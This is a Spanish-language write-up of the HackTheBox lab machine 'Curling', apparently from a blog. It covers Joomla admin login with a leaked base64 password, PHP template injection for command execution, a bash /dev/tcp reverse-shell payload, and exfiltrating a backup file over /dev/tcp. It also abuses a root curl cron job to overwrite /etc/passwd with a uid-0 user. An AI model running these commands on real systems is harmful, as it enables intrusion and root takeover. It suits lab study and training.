---
title: HackTheBox - Curling
author: cotes
date: 2023-09-12 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Crontab Exploitation (curl)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Curling/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Curling Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Information Leakage, Crontab Exploitation (curl)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Curling/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Curling/02-versions.png)

c. Al inspeccionar el sitio web encontramos **un nombre de usuario** y un fichero **secret**

![](/assets/images/HTB/Easy/Curling/03-web.png)

* La cadena que obtenemos al visitar el fichero 'secret.txt' está encodeada en base64

    ```bash
    ❯ echo -n 'Q3VybGluZzIwMTgh' | base64 -d
    Curling2018!
    ```

* Nos autenticamos en el panel de administrador de Joomla (**/administrator**)

    ![](/assets/images/HTB/Easy/Curling/04-joomla.png)

d. Para ejecutar comandos, inyectamos una sentencia php en un template de error

![](/assets/images/HTB/Easy/Curling/05-rce.png)

* Para ejecutar comandos vamos a la ruta `http://<IP Curling>/templates/protostar/error.php?cmd=[Comando]`. Ahora, entablamos una reverse shell

```bash
Payload = bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<tun0 IP>/<Puerto>%200%3E%261%22
----------------------------------------------------------------------------------------
❯ nc -lvnp 443
www-data@curling:/var/www/html/templates/protostar$
```

### Escalada de Privilegios 💹

a. El usuario **floris** tiene un fichero password_backup el cual transferiremos a nuestra máquina

```bash
❯ nc -lvnp 4444 > password_backup
---------------------------------------------------------------------------------
www-data@curling:/home/floris$ cat < password_backup > /dev/tcp/10.10.14.18/4444
```

* El contenido del archivo lo pasamos por [**CyberChef**](https://gchq.github.io/CyberChef/). Veremos una posible credencial

    ![](/assets/images/HTB/Easy/Curling/06-password.png)

b. Veremos si la cadena anterior puede ser la contraseña del usuario **floris**

```bash
❯ ssh floris@10.10.10.150
floris@10.10.10.150's password: 5d<wdCbdZu)|hChXll
floris@curling:~$ 
```

c. Subimos [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) para saber si existen tareas cron ejecutándose en el sistema

```bash
floris@curling:~$ ./pspy64 

<SNIP>
2023/09/13 23:07:01 CMD: UID=0     PID=2220   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

* Puntos Principales:
    + [x] El usuario **root** ejecuta esta tarea.
    + [x] La opción `-K` en curl sirve para indicar un archivo de configuración en el que podemo indicar un url de la cual conseguirá la información y donde queremos que la guarde

d. Con lo anterior en mente, podemos indicar que queremos sobreescribir el fichero **`/etc/passwd`**, para añadir un nuevo usuario con lo mismo privilegios que root

* Copiamos el fichero '/etc/passwd' de la Máquina Curling.
* Con openssl generamos una contraseña válida (En el ejemplo la contraseña es **hola**)
* Agregamos el usuario 'evil' al final del archivo '/etc/passwd' copiado y montamos un servidor http con python

    ```bash
    ❯ tail -n 1 passwd
    evil:$1$4NQ2IHzW$TtycSVMvW6nOiprAtnxZK/:0:0::/home:/bin/bash
    -------------------------------------------------------------
    ❯ python -m http.server 80
    ```

* Modificamos el fichero **input**

    ```bash
    floris@curling:~/admin-area$ cat input 
    url = "http://<tun0 IP>/passwd"
    output = "/etc/passwd"
    ```

c. El usuario evil será válido en el sistema y si nos convertirmos en él, tendremos permisos como root

```bash
floris@curling:~/admin-area$ tail -n 1 /etc/passwd
evil:$1$4NQ2IHzW$TtycSVMvW6nOiprAtnxZK/:0:0::/home:/bin/bash
floris@curling:~/admin-area$ su evil
Password: hola
root@curling:~/floris/admin-area#
```